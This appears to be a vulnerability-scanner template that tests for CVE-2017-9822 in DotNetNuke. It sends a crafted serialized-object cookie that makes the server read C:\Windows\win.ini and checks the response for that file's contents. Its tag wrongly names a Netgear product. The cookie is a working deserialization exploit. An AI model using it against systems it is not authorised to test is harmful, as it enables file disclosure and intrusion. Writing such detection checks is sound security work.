id:
name: CVE-2017-9822
transport: http
tags:
  -  Netgear-Company's-product
rules:
  req:
    request:
      cache: true
      method: GET
      path: /__
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
        Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
        Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        Connection: close
        Cookie: 'dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'
      follow_redirects: true
    expression: response.status==404 &&
      response.body.bcontains(b'; for 16-bit app support') &&
      response.body.bcontains(b'[fonts]') &&
      response.body.bcontains(b'[extensions]') &&
      response.body.bcontains(b'[mci extensions]') &&
      response.body.bcontains(b'[files]') &&
      response.body.bcontains(b'[Mail]') &&
      response.body.bcontains(b'MAPI=1')
expression: req()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2017-9822漏洞"